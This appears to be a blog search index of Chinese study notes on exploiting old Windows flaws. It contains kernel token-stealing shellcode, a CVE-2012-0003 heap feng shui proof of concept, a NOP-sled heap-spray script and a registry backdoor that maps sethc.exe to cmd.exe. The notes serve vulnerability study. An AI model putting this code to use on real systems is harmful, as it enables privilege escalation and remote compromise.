<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>漏洞分析要点记录</title>
    <url>/2020/07/10/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A6%81%E7%82%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>漏洞分析要点：</p>
<ul>
<li>涉及到堆的，先使用!heap指令，可以得到是什么使用的堆</li>
<li>涉及到JS和html的，有可能需要针对一些元素的操作进行逆向分析</li>
<li>做合理猜测</li>
<li>要合理使用栈回溯的功能，观察重点地址在函数中的传递</li>
</ul>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核漏洞利用小结</title>
    <url>/2020/06/11/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>学习过程中总结以下Windows内核漏洞的基础</p>
<a id="more"></a>

<h1 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h1><p><code>NtQueryIntervalProfile = GetProcAddress(GetModuleHandle(&quot;ntdll&quot;), &quot;NtQueryIntervalProfile&quot;);</code></p>
<p><code>nt!NtQueryIntervalProfile</code>用来<code>call HalDispatchTable+4</code>以控制程序执行流程</p>
<p><code>NtQuerySystemInformation  = GetProcAddress(GetModuleHandle(&quot;ntdll&quot;), &quot;NtQuerySystemInformation&quot;);</code></p>
<p><code>NtQuerySystemInformation</code>用来查询系统的信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123; SystemModuleInformation = <span class="number">11</span> &#125;;</span><br><span class="line">NtQuerySystemInformation(SystemModuleInformation, &amp;ModuleInfo, <span class="keyword">sizeof</span> ModuleInfo, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KernelHandle = LoadLibrary(ModuleInfo.Modules[<span class="number">0</span>].FullPathName + ModuleInfo.Modules[<span class="number">0</span>].OffsetToFileName);</span><br></pre></td></tr></table></figure>

<p>这一步得到的<code>KernelHandle</code>可以看作是内核的句柄，也能看作是一个基地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HalDispatchTable = (ULONG) GetProcAddress(KernelHandle, <span class="string">"HalDispatchTable"</span>) - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br><span class="line">PsInitialSystemProcess = (ULONG) GetProcAddress(KernelHandle, <span class="string">"PsInitialSystemProcess"</span>) - (ULONG)KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br><span class="line">PsReferencePrimaryToken = (ULONG) GetProcAddress(KernelHandle, <span class="string">"PsReferencePrimaryToken"</span>) - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br><span class="line">PsLookupProcessByProcessId = (ULONG) GetProcAddress(KernelHandle, <span class="string">"PsLookupProcessByProcessId"</span>) - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br></pre></td></tr></table></figure>

<p>其中<code>HalDispatchTable</code>是我们要覆写的地址-4，<code>PsInitialSystemProcess</code>是一个指针，其中存着指向<code>System Process</code>的<code>PEPROCESS</code>指针，<code>PsReferencePrimaryToken</code>函数为指定进程增加主令牌的引用计数，并返回指向给定进程的主要令牌的指针，<code>PsLookupProcessByProcessId</code>接受进程的进程ID，并返回指向该进程的EPROCESS结构的引用指针</p>
<p>那么这里为什么要<code>GetProcAddress</code>之后再减去<code>KernelHandle</code>然后再加上<code>ModuleInfo.Modules[0].ImageBase</code>呢？</p>
<p>这是因为，<code>LoadLibrary</code>导入的模块是属于当前进程的，并不属于内核，所以<code>GetProcAddress</code>后减去<code>KernelHandle</code>得到偏移，然后再加上<code>ModuleInfo.Modules[0].ImageBase</code>即内核基地址，才能得到相关函数在内核中的地址</p>
<p>用<code>CVE-2013-3660</code>的<code>Shellcode</code>来说，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ULONG __<span class="function">stdcall <span class="title">ShellCode</span><span class="params">(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID  TargetProcess;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Record that the exploit completed.</span></span><br><span class="line">    Finished = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fix the corrupted HalDispatchTable,</span></span><br><span class="line">    HalDispatchTable[<span class="number">1</span>] = HalQuerySystemInformation <span class="comment">//ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Find the EPROCESS structure for the process I want to escalate</span></span><br><span class="line">    <span class="keyword">if</span> (PsLookupProcessByProcessId(TargetPid, &amp;TargetProcess) == STATUS_SUCCESS) &#123;</span><br><span class="line">        PACCESS_TOKEN SystemToken;</span><br><span class="line">        PACCESS_TOKEN TargetToken;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the Token object for my target process, and the SYSTEM process.</span></span><br><span class="line">        TargetToken = (PACCESS_TOKEN) PsReferencePrimaryToken(TargetProcess);</span><br><span class="line">        SystemToken = (PACCESS_TOKEN) PsReferencePrimaryToken(*PsInitialSystemProcess);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the token in the target process, and replace with the system token.</span></span><br><span class="line">        FindAndReplaceMember((PDWORD) TargetProcess,</span><br><span class="line">                             (DWORD)  TargetToken,</span><br><span class="line">                             (DWORD)  SystemToken,</span><br><span class="line">                             <span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用内核态执行了用户态的shellcode代码，先用<code>PsLookupProcessByProcessId</code>得到当前进程，然后两个<code>PsReferencePrimaryToken</code>得到当前进程的token和System token，并将其交换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FindAndReplaceMember</span><span class="params">(PDWORD Structure,</span></span></span><br><span class="line"><span class="function"><span class="params">                          DWORD CurrentValue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          DWORD NewValue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          DWORD MaxSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD i, Mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Microsoft QWORD aligns object pointers, then uses the lower three</span></span><br><span class="line">    <span class="comment">// bits for quick reference counting.</span></span><br><span class="line">    Mask = ~<span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mask out the reference count.</span></span><br><span class="line">    CurrentValue &amp;= Mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Scan the structure for any occurrence of CurrentValue.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxSize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((Structure[i] &amp; Mask) == CurrentValue) &#123;</span><br><span class="line">            <span class="comment">// And finally, replace it with NewValue.</span></span><br><span class="line">            Structure[i] = NewValue;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Member not found.</span></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞战争学习日记(5)</title>
    <url>/2020/06/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-5/</url>
    <content><![CDATA[<p>学习了CVE-2011-2005，Afd.sys中的漏洞，有坑待填</p>
<a id="more"></a>

<p>尽管书中对于为什么要那么构造数据说的很清楚，但是，关于在哪里覆写了<code>HalDispatchTable</code>的<code>vftable</code>，以及如何覆写的相关内容并没有提及，网上也没有相关内容</p>
<p>参考：<a href="http://c00c.cc/1500623869.html" target="_blank" rel="noopener">http://c00c.cc/1500623869.html</a></p>
]]></content>
      <categories>
        <category>漏洞战争</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞战争学习日记(4)</title>
    <url>/2020/06/03/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-4/</url>
    <content><![CDATA[<p>学习Windows下Kernel相关</p>
<p>学习内核漏洞利用部分第一个漏洞：360安全卫士本地提权漏洞</p>
<a id="more"></a>

<p>漏洞成因是360对注册表操作单独做了一个底层的实现，然而这个实现并没有检测调用者的权限，导致任意用户可以随意修改注册表的任意条目，从而完成利用</p>
<h1 id="利用程序分析"><a href="#利用程序分析" class="headerlink" title="利用程序分析"></a>利用程序分析</h1><p>利用程序的功能是在远程开端口，可以远程连接上去。连接上之后是登录界面，此时按<code>SHIFT</code>五下会跳出cmd窗口</p>
<p>做成这样并不是为了花里胡哨的，而是漏洞面导致的</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>首先调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RegOpenKeyA(HKEY_LOCAL_MACHINE, <span class="string">"Software\Microsoft\Windows\CurrentVersion\App Paths\360safe.exe"</span>, &amp;phkResult);</span><br><span class="line">RegQueryValueExA(phkResult, <span class="string">"Path"</span>, <span class="number">0</span>, &amp;Type, &amp;Data, &amp;cbData);</span><br></pre></td></tr></table></figure>

<p>能得到目标机器中360安全卫士的路径，根据该路径可以找到目标动态链接库</p>
<p>然后用<code>LoadLibraryA</code>函数将该链接库导入，并用<code>GetProcAddress</code>函数得到其中的漏洞函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InitRegEngine</span><br><span class="line">BRegDeleteKey</span><br><span class="line">BRegOpenKey</span><br><span class="line">BregCloseKey</span><br><span class="line">BRegSetValueEx</span><br><span class="line">BRegCreateKey</span><br></pre></td></tr></table></figure>

<p>根据利用程序，其之后对注册表创建了一些键值</p>
<p>利用<code>BregOpenKey</code>打开<code>SYSTEM\CurrentControlSet\Control\Terminal Server</code>键，<code>BRegSetValueEx</code>设置<code>fDenyTSConnections</code>为0，这一步是为了打开远程协助功能</p>
<p>利用<code>BregOpenKey</code>打开<code>SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp</code>键，<code>BRegSetValueEx</code>设置<code>PortNumber</code>为3389</p>
<p>利用<code>BregOpenKey</code>打开<code>SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</code>键，<code>BRegSetValueEx</code>设置</p>
<p><code>PortNumber</code>为3389，这两步是修改远程桌面连接的端口为3389</p>
<p>利用<code>BregOpenKey</code>打开<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution</code>键，<code>BRegCreateKey</code>创建<code>sethc.exe</code>键，<code>BRegSetValueEx</code>设置<code>Debugger</code>为<code>cmd.exe</code>，这样就能在五次<code>SHIFT</code>的时候打开<code>cmd.exe</code></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该漏洞很没意思，但是学习到了一些注册表项的用法，也算是有点价值</p>
]]></content>
      <categories>
        <category>漏洞战争</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞战争学习日记(3)</title>
    <url>/2020/05/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-3/</url>
    <content><![CDATA[<p>学习堆溢出第二例，CVE-2012-0003</p>
<a id="more"></a>

<p>书中形容该漏洞 ”利用技术构造得相当精妙，堪称艺术“ ，故仔细学习</p>
<h1 id="所谓基于导图推算的漏洞分析方法"><a href="#所谓基于导图推算的漏洞分析方法" class="headerlink" title="所谓基于导图推算的漏洞分析方法"></a>所谓基于导图推算的漏洞分析方法</h1><p>书中介绍了 ”基于导图推算的漏洞分析方法“ ，即用一个导图来描述出关键数据的传播路径，进而找到相关变量及其含义</p>
<p>对关键地址下断点，并打印出相关变量的值</p>
<h2 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h2><p>书中使用了ImmDBG条件记录断点，我由于不想安装ImmDBG，故使用WinDBG</p>
<p>WinDBG下断点的时候，可以单独下断点，也可在断点后跟随几条指令：</p>
<p><code>bp DEADBEEF</code></p>
<p><code>bp DEADBEEF &quot;.echo hello;&quot;</code></p>
<p>指令由双引号括起来，多条指令用<code>;</code>间隔，利用该特性便和完成类似ImmDBG的条件记录断点的功能</p>
<p>例如：</p>
<p><code>bp 76B2D0ED &quot;printf \&quot;v11 = 0x%x \\n\&quot;, poi(@ebx+@eax);gc;&quot;</code></p>
<p>就实现了变量<code>v11</code>的打印</p>
<p>通过这种方式，对关键变量进行打印，能做到辅助分析的效果</p>
<h2 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h2><p>还是书中的例子，想要<code>[ebx+eax] == 0x73b29f</code>的时候断下来，就可以这样下断点：</p>
<p><code>bp 76B2D0ED &quot;j (poi(@ebx+@eax) == 0x73b29f) &#39;&#39;;&#39;gc&#39;&quot;</code></p>
<p>当<code>poi(@ebx+@eax) == 0x73b29f</code>的时候，只断下，什么也不执行，如果不等的时候，<code>gc</code>命令会让程序继续执行</p>
<p>，这样就实现了类似条件断点的功能</p>
<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p>当音轨事件为0x73b29f的时候，会产生堆溢出，原因是程序通过音轨事件的这个数字计算的偏移超出了块的大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(0x73b29f &amp; 0xff) &amp; 0x0f = 0x0f</span><br><span class="line">0x0f &lt;&lt; 7 = 0x780</span><br><span class="line">0x780 + ((0x73b29f &amp; 0xff00) &gt;&gt; 8) = 0x832</span><br><span class="line">(0x832 + 0) / 2 = 0x419</span><br></pre></td></tr></table></figure>

<p>在漏洞发生处：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=02801071 edi=028014e8</span><br><span class="line">eip=76b2d224 esp=185cfe80 ebp=185cfea0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">WINMM!midiOutPlayNextPolyEvent+0x1ec:</span><br><span class="line">76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:02801071=08</span><br><span class="line"></span><br><span class="line">0:014&gt; db esi</span><br><span class="line">02801071  08 00 00 c1 c6 2d 00 00-00 00 00 9c 35 1e 00 02  .....-......5...</span><br><span class="line">02801081  09 00 00 c2 c6 2d 00 00-00 00 00 30 ed c6 01 02  .....-.....0....</span><br><span class="line">02801091  09 00 00 c3 c6 2d 00 00-00 00 00 70 ee c6 01 02  .....-.....p....</span><br><span class="line">028010a1  09 00 00 c4 c6 2d 00 00-00 00 00 e0 ee c6 01 02  .....-..........</span><br><span class="line">028010b1  09 00 00 c5 c6 2d 00 00-00 00 00 60 ef c6 01 02  .....-.....`....</span><br><span class="line">028010c1  09 00 00 c6 c6 2d 00 00-00 00 00 00 e1 c6 01 02  .....-..........</span><br><span class="line">028010d1  09 00 00 c7 c6 2d 00 00-00 00 00 40 e1 c6 01 02  .....-.....@....</span><br><span class="line">028010e1  09 00 00 c8 c6 2d 00 00-00 00 00 f0 e1 c6 01 02  .....-..........</span><br></pre></td></tr></table></figure>

<p>可以看到这里取出的是08，而这个08恰好是string对象的type。后面的几句的代码中，取出这个08之后，会对其进行增1并放回原处，这样原本是08的这里就变成了09，而09是object的type。众所周知，一个对象的前四个字节是虚表，string的前四个字节是我们传入的字符串，那么我们就相当于控制了一个对象的虚表</p>
<p>再看一下esi这块内存的堆块是怎样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:014&gt; !heap -p -a 02801071 </span><br><span class="line">    address 02801071 found in</span><br><span class="line">    _HEAP @ 140000</span><br><span class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">        02801058 0081 0000  [01]   02801060    00400 - (busy)</span><br><span class="line">        </span><br><span class="line">0:014&gt; dd 02801060    </span><br><span class="line">02801060  00008103 80000000 00000000 01c82ac0</span><br><span class="line">02801070  00000802 002dc6c1 00000000 001e359c</span><br><span class="line">02801080  00000902 002dc6c2 00000000 01c6ed30</span><br><span class="line">02801090  00000902 002dc6c3 00000000 01c6ee70</span><br><span class="line">028010a0  00000902 002dc6c4 00000000 01c6eee0</span><br><span class="line">028010b0  00000902 002dc6c5 00000000 01c6ef60</span><br><span class="line">028010c0  00000902 002dc6c6 00000000 01c6e100</span><br><span class="line">028010d0  00000902 002dc6c7 00000000 01c6e140</span><br></pre></td></tr></table></figure>

<p>这就是html中select控件的对象</p>
<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">  var heap = new heapLib.ie();</span><br><span class="line">  var selob = document.createElement("select")</span><br><span class="line">selob.w0 = unescape("%u0c0c%u0c0c")</span><br><span class="line">selob.w1 = alert</span><br><span class="line">selob.w2 = alert</span><br><span class="line">selob.w3 = alert</span><br><span class="line">selob.w4 = alert</span><br><span class="line">selob.w5 = alert</span><br><span class="line">selob.w6 = alert</span><br><span class="line">selob.w7 = alert</span><br><span class="line">selob.w8 = alert</span><br><span class="line">selob.w9 = alert</span><br><span class="line">selob.w10 = alert</span><br><span class="line">selob.w11 = alert</span><br><span class="line">selob.w12 = alert</span><br><span class="line">selob.w13 = alert</span><br><span class="line">selob.w14 = alert</span><br><span class="line">selob.w15 = alert</span><br><span class="line">selob.w16 = alert</span><br><span class="line">selob.w17 = alert</span><br><span class="line">selob.w18 = alert</span><br><span class="line">selob.w19 = alert</span><br><span class="line">selob.w20 = alert</span><br><span class="line">selob.w21 = alert</span><br><span class="line">selob.w22 = alert</span><br><span class="line">selob.w23 = alert</span><br><span class="line">selob.w24 = alert</span><br><span class="line">selob.w25 = alert</span><br><span class="line">selob.w26 = alert</span><br><span class="line">selob.w27 = alert</span><br><span class="line">selob.w28 = alert</span><br><span class="line">selob.w29 = alert</span><br><span class="line">selob.w30 = alert</span><br><span class="line">selob.w31 = alert</span><br><span class="line">selob.w32 = alert</span><br><span class="line">selob.w33 = alert</span><br><span class="line">selob.w34 = alert</span><br><span class="line">selob.w35 = alert</span><br><span class="line">selob.w36 = alert</span><br><span class="line">selob.w37 = alert</span><br><span class="line">selob.w38 = alert</span><br><span class="line">selob.w39 = alert</span><br><span class="line">selob.w40 = alert</span><br><span class="line">selob.w41 = alert</span><br><span class="line">selob.w42 = alert</span><br><span class="line">selob.w43 = alert</span><br><span class="line">selob.w44 = alert</span><br><span class="line">selob.w45 = alert</span><br><span class="line">selob.w46 = alert</span><br><span class="line">selob.w47 = alert</span><br><span class="line">selob.w48 = alert</span><br><span class="line">selob.w49 = alert</span><br><span class="line">selob.w50 = alert</span><br><span class="line">selob.w51 = alert</span><br><span class="line">selob.w52 = alert</span><br><span class="line">selob.w53 = alert</span><br><span class="line">selob.w54 = alert</span><br><span class="line">selob.w55 = alert</span><br><span class="line"></span><br><span class="line">  var clones = new Array(1000);</span><br><span class="line"></span><br><span class="line">  function feng_shui() &#123;</span><br><span class="line">    heap.gc();</span><br><span class="line"></span><br><span class="line">    var i = 0;</span><br><span class="line">    while (i <span class="tag">&lt; <span class="attr">1000</span>) &#123;</span></span><br><span class="line"><span class="tag">      <span class="attr">clones</span>[<span class="attr">i</span>] = <span class="string">selob.cloneNode(true)</span></span></span><br><span class="line"><span class="tag">      <span class="attr">i</span> = <span class="string">i</span> + <span class="attr">1</span>;</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">j</span> = <span class="string">0;</span></span></span><br><span class="line">    while (j &lt; 1000) &#123;</span><br><span class="line">      delete clones[j];</span><br><span class="line">      CollectGarbage();</span><br><span class="line">      j  = j + 2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  feng_shui();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">function trigger()&#123;</span><br><span class="line">  var k = 999;</span><br><span class="line">  while (k &gt; 0) &#123;</span><br><span class="line">    if (typeof(clones[k].w0) == "string") &#123;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      clones[k].w0('come on!');</span><br><span class="line">    &#125;</span><br><span class="line">    k = k - 2;</span><br><span class="line">  &#125;</span><br><span class="line">  feng_shui();</span><br><span class="line">  document.audio.Play();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">for</span>=<span class="string">audio</span> <span class="attr">event</span>=<span class="string">PlayStateChange(oldState,newState)</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span> (oldState == <span class="number">3</span> &amp;&amp; newState == <span class="number">0</span>) &#123;</span></span><br><span class="line">    trigger();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">object</span> <span class="attr">ID</span>=<span class="string">"audio"</span> <span class="attr">WIDTH</span>=<span class="string">1</span> <span class="attr">HEIGHT</span>=<span class="string">1</span> <span class="attr">CLASSID</span>=<span class="string">"CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"fileName"</span> <span class="attr">value</span>=<span class="string">"crash.mid"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"SendPlayStateChangeEvents"</span> <span class="attr">value</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">NAME</span>=<span class="string">"AutoStart"</span> <span class="attr">value</span>=<span class="string">"True"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"uiMode"</span> <span class="attr">value</span>=<span class="string">"mini"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"Volume"</span> <span class="attr">value</span>=<span class="string">"-300"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我这一段是用msf生成的，前面的很大一块是heaplib的代码，所以不用看</p>
<p>单看第三行往后的代码， 可以看到<code>selob.w0</code>就是字符串，其type是08，在midi被播放后会被变成09</p>
<p>剩下的就没啥可说了，随后自己调一下它是如何计算size的。</p>
<p>如果想要利用这个完成shellcode执行的话，就需要先堆喷，在0x0c0c0c0c附近部署shellcode，然后通过执行w0来完成shellcode的执行</p>
<p>关于shellcode，就是最基本的那种，除了对shellcode本身的加密解密用了一些非常不常见的汇编之外，其他都是通常的操作，<code>kernel32!WinExec(&quot;calc.exe&quot;)</code></p>
]]></content>
      <categories>
        <category>漏洞战争</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞战争学习日记(2)</title>
    <url>/2020/05/18/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-2/</url>
    <content><![CDATA[<p>学习栈溢出第二例，CVE-2010-3333</p>
<a id="more"></a>

<p>这个漏洞出现在Microsoft Office Word 2003版本以及2007版本中，但是可能由于时间太过久远，我并没有找到相关可执行文件或者安装包的下载，所以这个洞并没有实际调试，仅跟书学习了调试相关操作</p>
<p><code>!address</code>指令可以显示相关地址的属性等信息</p>
<p><code>lm</code>相关指令可以显示已加载的模块的相关信息</p>
<p><code>u</code>指令可以反编译指定地址之后的代码</p>
<p><code>uf</code>指令用来反编译整个函数的代码</p>
<p><code>ub</code>指令用来查看当前指令之前的汇编代码</p>
<hr>
<p>这道题的漏洞成因是在于，程序员太相信用户，或者相信用户提供的文档，从而没有边界检查，导致栈溢出</p>
]]></content>
      <categories>
        <category>漏洞战争</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞战争学习日记(1)</title>
    <url>/2020/05/15/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-1/</url>
    <content><![CDATA[<p>学习栈溢出第一例，CVE-2010-2883</p>
<a id="more"></a>

<h1 id="可读可写可执行内存"><a href="#可读可写可执行内存" class="headerlink" title="可读可写可执行内存"></a>可读可写可执行内存</h1><p>由于开启了DEP，因此在win下想要得到一段可读可写可执行的内存需要特殊的方法</p>
<p>在本例中，payload使用ROP的方法先后调用了如下几个函数：</p>
<ul>
<li>CreateFileA - 文件名用了内存中本就存在的一串字符串</li>
<li>CreateFileMapping - 创建文件映射对象的句柄</li>
<li>MapViewOfFile - 将文件映射到内存，该函数可指定这段内存的访问方式，在这里我们可以设置为可读可写可执行。</li>
<li>memcpy - 将js创建的堆中的shellcode复制到我们新建的可读可写可执行的内存</li>
</ul>
<h1 id="调试符号"><a href="#调试符号" class="headerlink" title="调试符号"></a>调试符号</h1><p>在线下载调试符号需要翻墙</p>
<h1 id="利用了js的堆喷以及堆风水"><a href="#利用了js的堆喷以及堆风水" class="headerlink" title="利用了js的堆喷以及堆风水"></a>利用了js的堆喷以及堆风水</h1><p><a href="http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank" rel="noopener">http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html</a></p>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>为嘛要用js呢，其实第一点就是该程序支持js，第二点其实就是js代码是我们可控的，可以非常直接地完成堆喷的操作</p>
]]></content>
      <categories>
        <category>漏洞战争</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Heap Spray</title>
    <url>/2020/05/13/Heap-Spray/</url>
    <content><![CDATA[<p>学习Windows下JS的堆喷</p>
<a id="more"></a>

<h1 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h1><p>堆喷是一个使用非常广泛的技术，其在浏览器等应用程序的漏洞利用中非常常见</p>
<p>如下代码就是常见的使用堆喷的JS代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>);		&lt;---------- 1</span><br><span class="line"></span><br><span class="line">// Create a 1MB string of NOP instructions followed by shellcode:</span><br><span class="line">//</span><br><span class="line">// malloc header   string length   NOP slide   shellcode   NULL terminator</span><br><span class="line">// 32 bytes        4 bytes         x bytes     y bytes     2 bytes</span><br><span class="line"></span><br><span class="line">while (nop.length &lt;= 0x100000/2) nop += nop;	&lt;---------- 2</span><br><span class="line"></span><br><span class="line">nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2);	&lt;---------- 3</span><br><span class="line"></span><br><span class="line">var x = new Array();	&lt;------------- 4</span><br><span class="line"></span><br><span class="line">// Fill 200MB of memory with copies of the NOP slide and shellcode</span><br><span class="line">for (var i = 0; i &lt; 200; i++) &#123; </span><br><span class="line">    x[i] = nop + shellcode;	&lt;----------- 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>nop</code>这个变量是一串<code>unicode</code>字符串，要注意的是，每个<code>unicode</code>字符的长度是2字节</p>
<p>2处，<code>nop.length</code>指的是该字符串有多少个<code>unicode</code>字符，并不是由多少字节，而这个while循环的目的是分配出一个0x100000字节大小的堆(实际上堆的大小是32+4+2+0x100000)</p>
<p>3处，<code>substring</code>是取子串，这里取的是<code>[0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2)</code>这么长，这里是去掉了堆头的32字节、字符串长度的4字节、<code>%u0000</code>截止的两字节，然后再减去shellcode的长度</p>
<p>4处这里，此时<code>nop+shellcode</code>分配出来的堆块的大小刚好就是0x100000字节，即1M，那么这个for循环就相当于直接分配了200M的堆，而堆中填充的是我们的滑板和shellcode</p>
<p>此时，计算一下，200M是0xC800000字节，那么就意味着，0xc0c0c0c这个地址是位于我分配出来的堆中的。此时，如果程序跳转到0xc0c0c0c这个地址来执行这里的代码，将会有很大的几率可以执行到滑板上，在没有开启DEP的情况下，堆上的数据还是可执行的，shellcode就会被执行</p>
<p>然而，DEP一般都是开启的，直接执行堆上的数据就变得不可行了</p>
]]></content>
      <categories>
